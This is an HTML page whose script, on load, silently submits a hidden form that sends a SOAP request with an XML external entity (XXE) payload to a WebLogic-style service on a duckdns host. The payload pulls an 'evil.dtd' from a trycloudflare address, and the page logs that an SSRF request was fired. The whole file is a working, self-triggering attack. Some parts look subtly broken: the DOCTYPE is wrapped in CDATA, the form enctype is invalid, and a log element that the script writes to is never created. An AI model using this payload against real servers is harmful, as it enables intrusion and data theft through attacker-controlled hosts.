index.html

<script>
  const domain = 'ssrf1.duckdns.org';
  const port = 7001;
  const path = '/ws_utc/services/UTCCatalogService';
  const fullUrl = `http://${domain}:${port}${path}`;

  const xmlPayload = `
  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header/>
    <soapenv:Body>
      <xxe xmlns="x"><![CDATA[
        <!DOCTYPE root [
          <!ENTITY % xxe SYSTEM "https://okay-blood-gradually-remedy.trycloudflare.com/evil.dtd">
          %xxe;
        ]>
      ]]></xxe>
    </soapenv:Body>
  </soapenv:Envelope>
  `;

  const form = document.createElement('form');
  form.action = fullUrl;
  form.method = 'POST';
  form.enctype = 'text/xml';
  form.target = 'hiddenFrame';

  const input = document.createElement('input');
  input.type = 'hidden';
  input.name = 'data';
  input.value = xmlPayload;
  form.appendChild(input);

  document.body.appendChild(form);

  const iframe = document.createElement('iframe');
  iframe.name = 'hiddenFrame';
  iframe.style.display = 'none';
  document.body.appendChild(iframe);

  setTimeout(() => {
    form.submit();
    document.getElementById("log").innerText = `📡 SSRF POST fired: ${fullUrl}`;
  }, 1000);
</script>
